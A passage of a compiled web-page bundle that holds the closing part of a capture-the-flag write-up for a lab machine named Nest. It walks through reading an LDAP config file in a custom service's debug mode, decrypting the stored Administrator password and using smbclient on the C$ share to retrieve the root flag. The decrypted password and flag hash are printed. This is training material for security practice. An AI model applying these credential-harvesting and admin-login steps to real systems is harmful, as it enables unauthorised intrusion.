tree:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},">setdir ..\n\nCurrent directory set to HQK\n>list\n\nUse the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command\n\n QUERY FILES IN CURRENT DIRECTORY\n\n[DIR]  ALL QUERIES\n[DIR]  LDAP\n[DIR]  Logs\n[1]   HqkSvc.exe\n[2]   HqkSvc.InstallState\n[3]   HQK_Config.xml\n\nCurrent Directory: HQK\n")),(0,i.kt)("p",null,"We went in ",(0,i.kt)("inlineCode",{parentName:"p"},"HQK")," directory and there is a ",(0,i.kt)("inlineCode",{parentName:"p"},"LDAP")," directory in it.\nLet's see this one:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},">setdir LDAP\n\nCurrent directory set to LDAP\n>list\n\nUse the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command\n\n QUERY FILES IN CURRENT DIRECTORY\n\n[1]   HqkLdap.exe\n[2]   Ldap.conf\n\nCurrent Directory: LDAP\n")),(0,i.kt)("p",null,"There is a config file and config files are prone to give passwords, so let's\nread it.\nHopefully with the debug mode we unlocked the ",(0,i.kt)("inlineCode",{parentName:"p"},"showquery")," = ",(0,i.kt)("inlineCode",{parentName:"p"},"cat"),"."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},">showquery 2\n\nDomain=nest.local\nPort=389\nBaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local\nUser=Administrator\nPassword=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=\n")),(0,i.kt)("p",null,"This password is ciphered too, as earlier let's paste it in a search engine:"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"VB.Net: ",(0,i.kt)("a",{parentName:"li",href:"https://dotnetfiddle.net/LdhDaa"},"https://dotnetfiddle.net/LdhDaa")),(0,i.kt)("li",{parentName:"ul"},"C#: ",(0,i.kt)("a",{parentName:"li",href:"https://dotnetfiddle.net/ndCO9U"},"https://dotnetfiddle.net/ndCO9U"))),(0,i.kt)("p",null,"So the deciphered password is: ",(0,i.kt)("inlineCode",{parentName:"p"},"XtH4nkS4Pl4y1nGX"),"."),(0,i.kt)("p",null,"Let's get root flag via the ",(0,i.kt)("inlineCode",{parentName:"p"},"C$")," share with the ",(0,i.kt)("inlineCode",{parentName:"p"},"Administrator")," account:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"$ smbclient '\\\\10.10.10.178\\C$' -U 'Administrator'\nUnable to initialize messaging context\nEnter WORKGROUP\\Administrator's password: \nTry \"help\" to get a list of possible commands.\nsmb: \\> cd Users\\Administrator\\Desktop\nsmb: \\Users\\Administrator\\Desktop\\> ls\n  .                                  DR        0  Sun Jan 26 08:20:50 2020\n  ..                                 DR        0  Sun Jan 26 08:20:50 2020\n  desktop.ini                       AHS      282  Sat Jan 25 23:02:44 2020\n  root.txt                            A       32  Tue Aug  6 00:27:26 2019\n\n                10485247 blocks of size 4096. 6545277 blocks available\nsmb: \\Users\\Administrator\\Desktop\\> mget root.txt\nGet file root.txt? y\ngetting file \\Users\\Administrator\\Desktop\\root.txt of size 32 as root.txt (0,3 KiloBytes/sec) (average 0,3 KiloBytes/sec)\n\n$ cat root.txt\n6594c2eb084bc0f08a42f0b94b878c41\n")))}d.isMDXComponent=!0},75459:(e,n,t)=>{t.d(n,{Z:()=>r});const r=t.p+"assets/images/nest-3f8c13f7da470c39352dc63f7e3964a4.png"}}]);